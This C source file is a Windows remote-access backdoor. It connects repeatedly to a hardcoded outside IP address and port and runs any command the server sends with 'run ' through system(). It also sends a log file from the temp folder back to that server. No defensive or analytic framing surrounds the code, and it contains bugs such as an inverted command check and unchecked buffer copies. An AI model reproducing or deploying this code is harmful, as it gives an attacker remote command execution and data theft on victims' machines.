#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h> 
#include <stdio.h>
#include <string.h>
#include <locale.h>
#include "Commands.c"

// #pragma comment(lib, "ws2_32.lib")

#define BUFFER_SIZE 1024
#define HOST "26.199.90.194"
#define PORT 12345

void initialzeSocket() {
    WSADATA wsaData;
    WORD ver = MAKEWORD(2, 2);

    int wsResult = WSAStartup(ver, &wsaData); 
    if (wsResult != 0) {
        printf("WSAStartup failed: %d\n", wsResult);
        exit(1);
    }
}

void checkSocket(SOCKET clientSocket)  {
    if (clientSocket == INVALID_SOCKET) {
            printf("Socket failed: %ld\n", WSAGetLastError());
            WSACleanup();
            exit(1);
        }

}

int main() {
    char tempPath[MAX_PATH];
    GetTempPath(MAX_PATH, tempPath);
    char buffer[BUFFER_SIZE];
    char logFilePath[MAX_PATH];
    sprintf(logFilePath, "%slog.txt", tempPath);

    initialzeSocket();

    SOCKET clientSocket = INVALID_SOCKET;

    while (1) {
        clientSocket = socket(AF_INET, SOCK_STREAM, 0);
        checkSocket(clientSocket);

        struct sockaddr_in serverAddress;
        serverAddress.sin_family = AF_INET;
        serverAddress.sin_port = htons(PORT);
        int inetPtonResult = inet_pton(AF_INET, HOST, &serverAddress.sin_addr);
        if (inetPtonResult != 1) {
            printf("InetPton failed: %d\n", WSAGetLastError());
            closesocket(clientSocket);
            WSACleanup();
            return 1;
        }

        int connectResult = connect(clientSocket, (struct sockaddr *)&serverAddress, sizeof(serverAddress));
        if (connectResult == SOCKET_ERROR) {
            printf("Connect failed: %ld\n", WSAGetLastError());
            closesocket(clientSocket);
            Sleep(1000); // ждать 1 секунду перед повторной попыткой
            continue;
        }

        printf("Connected to server.\n");

        char buffer[BUFFER_SIZE];
        while (1) {
            char message[BUFFER_SIZE];
            int bytesReceived = recv(clientSocket, buffer, BUFFER_SIZE, 0);
            if (bytesReceived > 0) {
                buffer[bytesReceived] = '\0';
                printf("%s\n", buffer);

                if (strncmp(buffer, "run ", 4) == 0) {
                    char command[256];
                    strcpy(command, buffer + 4);
                    printf("Running command: %s\n", command);
                    char fcommand[256];
                    sprintf(fcommand,"%s > log.txt", command);
                    system(fcommand);
                    strcpy(message, fcommand);
                }

                else if (strncmp(buffer, "getlog", 7)) {
                        setlocale(LC_ALL, "Ru");
                            FILE *fp = fopen(logFilePath, "rb");
                            if(fp) {
                                char fbuffer[BUFFER_SIZE];
                                while (fgets(buffer, BUFFER_SIZE, fp) != NULL) {
                                    send(clientSocket, buffer, strlen(buffer), 0);
                                }

                                fclose(fp); 
                            } 
                            else {
                                printf("Unable to open file %s.\n", logFilePath);
                            }
                }
                else {
                    strcpy(message, "Command not found");
                }

                send(clientSocket, message, strlen(message), 0);

            }
            else {
                printf("Connection closed.\n");
                break;
            }
        }

        closesocket(clientSocket);
    }

    WSACleanup();
    return 0;
}

